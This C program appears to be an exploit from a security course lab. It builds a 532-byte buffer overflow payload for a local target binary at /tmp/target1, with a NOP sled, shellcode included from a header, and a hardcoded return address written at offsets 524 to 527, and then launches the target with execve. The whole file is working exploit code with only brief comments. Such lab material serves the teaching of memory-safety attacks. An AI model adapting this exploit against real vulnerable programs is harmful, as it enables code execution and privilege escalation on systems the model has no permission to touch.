#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"
#define NOP    0x90
#define END    0x00

int main(void)
{
  char *args[3];
  char *env[1];

  int ofsize = 532;
  int ptr;
  int i;

  char payload[ofsize];

  // Fill first half of payload with NOPs for NOP sled
  for(i = 0; i < ofsize-1; i++) {
    payload[i] = NOP;
  }

  // Inject shellcode
  ptr = (ofsize/2) + 1;
  for(i = 0; i < strlen(shellcode); i++) {
    payload[ptr] = shellcode[i];
    ptr++;
  } 

  // Insert address to overwrite return address with
  payload[524] = 0x30;
  payload[525] = 0xFA;
  payload[526] = 0xFF;
  payload[527] = 0xBF;
  payload[528] = END;
 
  args[0] = TARGET; args[1] = payload; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
